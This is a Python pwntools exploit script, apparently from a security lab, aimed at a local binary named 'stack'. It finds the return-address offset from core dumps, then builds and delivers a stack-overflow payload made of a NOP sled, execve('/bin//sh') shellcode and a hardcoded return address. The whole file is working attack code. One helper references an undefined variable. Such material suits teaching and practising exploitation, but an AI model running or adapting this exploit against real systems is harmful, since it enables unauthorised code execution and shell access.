from pwn import *
import os

#ubuntu 20.04 by default stores cores here
CORE_LOC="/var/lib/apport/coredump"
context.binary = ("../server-code/stack")
shellcode = (
    "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
    ).encode('latin-1')


def get_info():

    # write payload
    with open("test_payload", 'wb') as f:
        f.write(test_payload)

    # deliver payload to stdin
    with open("test_payload", 'rb') as g:
        # run process
        p = process("../server-code/stack", stdin=g, stdout=PTY)
        info(p.recv())
        p.wait()

        # get core file
        files = [f for f in os.listdir(CORE_LOC) if re.match(r'.*'+str(p.pid)+'.*',f)]
        assert(len(files) == 1) # sanity check
        core_file=os.path.join(CORE_LOC,files[0])
        core = Corefile(core_file)

        # find what address we tried to jump to on stack
        stack = core.rsp
        rip = core.rip
        info("rsp = %#x", stack)
        info("rip = %#x", rip)
        pattern = core.read(stack,8)
        info("pattern = %s", pattern)
        ra_offset = cyclic_find(pattern, n=8)
        info("ra offset is: %d" % ra_offset)
        p.close()
        print(ra_offset)

#construct new_payload
#get new shellcode
with open("mysh_64", 'rb') as f:
    new_shell = f.readlines()
new_shell = new_shell[0]
shellcode = new_shell
ra_offset = 120 #found from get_info()
shell_addr = p64(0x7fffffffe088) 
nop_sled = bytearray(0x90 for i in
        range(ra_offset-len(shellcode)))
new_payload = shellcode + nop_sled + shell_addr
new_payload = nop_sled + shellcode + shell_addr

with open("payload", 'wb') as f:
    f.write(new_payload)

with open("payload", 'rb') as g:
    # run process
    p = process("../server-code/stack", stdin=g, stdout=PTY)
    info(p.recv())
    p.wait()
    # get core file
    files = [f for f in os.listdir(CORE_LOC) if re.match(r'.*'+str(p.pid)+'.*',f)]
    assert(len(files) == 1) # sanity check
    core_file=os.path.join(CORE_LOC,files[0])
    core = Corefile(core_file)
    stack = core.rsp
    rip = core.rip
    info("rsp = %#x", stack)
    info("rip = %#x", rip)
    #p.interactive()
